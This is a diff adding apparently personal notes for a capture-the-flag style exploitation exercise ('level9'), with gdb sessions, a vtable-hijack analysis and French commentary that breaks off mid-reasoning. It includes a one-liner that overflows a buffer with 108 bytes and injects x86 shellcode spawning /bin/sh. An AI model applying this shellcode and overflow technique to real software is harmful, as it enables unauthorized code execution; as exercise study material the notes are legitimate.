@@ -1,0 +1,132 @@
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7d86060 <system>
+(gdb) info proc map
+process 2691
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/level9/level9
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/level9/level9
+	0xb7cfa000 0xb7cfc000     0x2000        0x0 
+	0xb7cfc000 0xb7d18000    0x1c000        0x0 /lib/i386-linux-gnu/libgcc_s.so.1
+	0xb7d18000 0xb7d19000     0x1000    0x1b000 /lib/i386-linux-gnu/libgcc_s.so.1
+	0xb7d19000 0xb7d1a000     0x1000    0x1c000 /lib/i386-linux-gnu/libgcc_s.so.1
+	0xb7d1a000 0xb7d44000    0x2a000        0x0 /lib/i386-linux-gnu/libm-2.15.so
+	0xb7d44000 0xb7d45000     0x1000    0x29000 /lib/i386-linux-gnu/libm-2.15.so
+	0xb7d45000 0xb7d46000     0x1000    0x2a000 /lib/i386-linux-gnu/libm-2.15.so
+	0xb7d46000 0xb7d47000     0x1000        0x0 
+	0xb7d47000 0xb7eea000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7eea000 0xb7eec000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7eec000 0xb7eed000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7eed000 0xb7ef0000     0x3000        0x0 
+	0xb7ef0000 0xb7fc8000    0xd8000        0x0 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
+	0xb7fc8000 0xb7fc9000     0x1000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
+	0xb7fc9000 0xb7fcd000     0x4000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
+	0xb7fcd000 0xb7fce000     0x1000    0xdc000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
+	0xb7fce000 0xb7fd5000     0x7000        0x0 
+	0xb7fdb000 0xb7fdd000     0x2000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7cfc000, 0xb8000000, "/bin/sh"
+0xb7ea7c58
+
+
+0x08048848
+
+./level9 $(python -c 'print 108 * "A" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+
+
+
+(gdb) x/wx $esp+0x10
+0xbffff710:	0x0804a078
+(gdb) x/s 0x0804a078
+0x804a078:	 "H\210\004\b"
+
+
+0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
+0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
+=> 0x08048632 <+62>:	movl   $0x6c,(%esp)
+(gdb) x/wx $esp+0x1c
+0xbffff71c:	0x0804a008
+(gdb) x/s 0x0804a008
+0x804a008:	 "H\210\004\b"
+
+
+0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
+0x08048650 <+92>:	mov    %ebx,0x18(%esp)
+=> 0x08048654 <+96>:	mov    0x1c(%esp),%eax
+(gdb) x/wx $esp+0x18
+0xbffff718:	0x0804a078
+(gdb) x/s 0x0804a078
+0x804a078:	 "H\210\004\b"
+
+
+=> 0x08048680 <+140>:	mov    (%eax),%eax
+(gdb) x/s $eax
+0x804a078:	 "H\210\004\b"
+(gdb) x/wx $eax
+0x804a078:	0x08048848
+
+
+=> 0x08048682 <+142>:	mov    (%eax),%edx
+(gdb) x/wx $edx
+0x804a00c:	0x41414141
+(gdb) x/s $edx
+0x804a00c:	 "AAAA"
+
+=> 0x08048684 <+144>:	mov    0x14(%esp),%eax
+(gdb) x/wx $esp+0x14
+0xbffff714:	0x0804a008
+(gdb) x/wx 0x0804a008
+0x804a008:	0x08048848
+(gdb) x/s 0x0804a008
+0x804a008:	 "H\210\004\bAAAA"
+
+(gdb) x/wx $esp+0x14
+0xbffff714:	0x0804a008
+(gdb) x/wx 0x0804a008
+0x804a008:	0x08048848
+(gdb) x/wx 0x08048848
+0x8048848 <_ZTV1N+8>:	0x0804873a
+(gdb) x/wx 0x0804873a
+0x804873a <_ZN1NplERS_>:	0x8be58955
+
+
+=> 0x0804868c <+152>:	mov    0x10(%esp),%eax
+(gdb) x/wx $eax
+0x804a008:	0x08048848
+(gdb) x/wx $esp+0x10
+0xbffff710:	0x0804a078
+
+
+   0x08048690 <+156>:	mov    %eax,(%esp)
+=> 0x08048693 <+159>:	call   *%edx
+(gdb) x/wx $edx
+0x804873a <_ZN1NplERS_>:	0x8be58955
+(gdb) x/wx $eax
+0x804a078:	0x08048848
+(gdb) x/wx 0x08048848
+0x8048848 <_ZTV1N+8>:	0x0804873a
+(gdb) x/wx 0x0804873a
+0x804873a <_ZN1NplERS_>:	0x8be58955
+
+Ok donc ça fait 
+
+call *%edx
+  -> *eax = *0x08048848 = op+
+
+  donc quand on override eax, il faut que eax = addresse du shell_code bin/sh
+ca donnerai :
+shell_code + "restant du nombre de byte pour overflow" + "addresse du début du buffer"
+
+mais en faisant ça on a une erreur
+car l y a cette ligne de code :
+   0x08048682 <+142>:	mov    (%eax),%edx
+qui va déplacer eax dans edx
+
+   0x08048680 <+140>:	mov    (%eax),%eax  registre de eax egale a valeur de eax -> 
+   0x08048682 <+142>:	mov    (%eax),%edx
